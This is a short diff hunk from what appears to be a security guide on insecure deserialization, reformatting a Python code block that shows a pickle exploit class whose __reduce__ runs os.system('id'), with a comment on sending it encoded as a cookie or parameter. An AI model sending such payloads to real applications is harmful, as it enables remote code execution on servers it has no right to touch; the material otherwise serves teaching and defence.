@@ -82,9 +82,13 @@ JNDI injection is not itself a serialization format. It becomes part of this wor
 Pickle executes arbitrary code during unpickling by design:
 ```python
 import pickle, os, base64
+
+
 class Exploit:
     def __reduce__(self):
-        return (os.system, ('id',))
+        return (os.system, ("id",))
+
+
 # base64 encode pickle.dumps(Exploit()) and send as cookie/param
 ```
 
